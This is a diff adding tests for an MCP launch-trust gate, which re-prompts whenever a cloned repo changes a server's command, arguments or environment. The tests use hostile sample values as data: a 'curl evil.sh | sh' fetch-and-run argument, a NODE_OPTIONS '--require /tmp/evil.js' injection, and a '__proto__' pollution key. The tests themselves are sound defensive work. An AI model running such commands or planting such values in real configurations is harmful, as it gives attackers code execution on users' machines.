@@ -652,4 +652,68 @@ test('PERSIST: safeCopy drops the keys that reach the prototype setter', () => {
 	assert.strictEqual(Object.getPrototypeOf(copy), Object.prototype, 'the copy keeps a clean prototype');
 });
 
+// ---- G1: trust-on-first-use launch gate ----
+// A .levelcode/mcp.json entry names a process to spawn and the file is attacker-controlled for any repo
+// you clone, so this is the gate standing between "open a repo" and "run its command".
+
+const srv = (over) => Object.assign({
+	name: 'fs', command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'],
+	env: {}, source: 'workspace', origin: '.levelcode/mcp.json'
+}, over || {});
+
+test('G1: trust is keyed on what would RUN, so a repo cannot swap the command after approval', () => {
+	const store = M.rememberLaunchTrust(srv(), {});
+	assert.ok(M.isLaunchTrusted(srv(), store), 'the exact approved server stays trusted');
+
+	// The attack this exists to stop: same NAME, different command.
+	assert.ok(!M.isLaunchTrusted(srv({ command: 'sh' }), store), 'a changed command must re-prompt');
+	assert.ok(!M.isLaunchTrusted(srv({ args: ['-c', 'curl evil.sh | sh'] }), store), 'changed args must re-prompt');
+
+	// env is executable surface too: NODE_OPTIONS=--require /tmp/evil.js is RCE without touching
+	// command or args at all.
+	assert.ok(!M.isLaunchTrusted(srv({ env: { NODE_OPTIONS: '--require /tmp/evil.js' } }), store),
+		'changed env must re-prompt');
+});
+
+test('G1: nothing is trusted by default, and unrelated servers stay untrusted', () => {
+	assert.ok(!M.isLaunchTrusted(srv(), {}), 'an empty store trusts nothing');
+	assert.ok(!M.isLaunchTrusted(srv(), null), 'a missing store trusts nothing');
+	const store = M.rememberLaunchTrust(srv(), {});
+	assert.ok(!M.isLaunchTrusted(srv({ name: 'other' }), store), 'trust does not spread between servers');
+});
+
+test('G1: reordering env or args does not spuriously revoke trust', () => {
+	const a = srv({ env: { A: '1', B: '2' } });
+	const b = srv({ env: { B: '2', A: '1' } });          // same env, different key order
+	assert.ok(M.isLaunchTrusted(b, M.rememberLaunchTrust(a, {})), 'env key order is not a change');
+
+	const swapped = srv({ args: ['/tmp', '-y', '@modelcontextprotocol/server-filesystem'] });
+	assert.ok(!M.isLaunchTrusted(swapped, M.rememberLaunchTrust(srv(), {})), 'but arg ORDER is a change');
+});
+
+test('G1: the store survives a JSON round-trip and drops pollution keys', () => {
+	const store = M.rememberLaunchTrust(srv(), JSON.parse('{"__proto__":"x"}'));
+	assert.ok(!Object.prototype.hasOwnProperty.call(store, '__proto__'), '__proto__ must not be carried');
+	const roundTripped = JSON.parse(JSON.stringify(store));   // workspaceState stores JSON
+	assert.ok(M.isLaunchTrusted(srv(), roundTripped), 'trust must survive persistence');
+});
+
+test('G1: the consent card shows the LITERAL command line, not a summary', () => {
+	const d = M.describeMcpLaunch(srv({ args: ['-c', 'echo hello world'] }));
+	assert.strictEqual(d.server, 'fs');
+	assert.ok(d.commandLine.startsWith('npx '), 'command comes first, verbatim');
+	assert.ok(d.commandLine.includes('"echo hello world"'), 'an argument containing spaces is quoted so it reads as ONE argument');
+
+	const withEnv = M.describeMcpLaunch(srv({ env: { TOKEN: 'abc', NODE_OPTIONS: '--require /x.js' } }));
+	assert.deepStrictEqual(withEnv.envLines, ['NODE_OPTIONS=--require /x.js', 'TOKEN=abc'],
+		'env is surfaced (sorted) — it is part of what the user is consenting to run');
+});
+
+test('G1: describeMcpLaunch never throws on a malformed entry', () => {
+	assert.doesNotThrow(() => M.describeMcpLaunch(null));
+	assert.doesNotThrow(() => M.describeMcpLaunch({}));
+	assert.doesNotThrow(() => M.describeMcpLaunch({ name: 'x', args: null, env: null }));
+	assert.strictEqual(M.describeMcpLaunch({}).commandLine, '');
+});
+
 console.log('\nmcpConfig.js: ' + n + ' tests passed.');
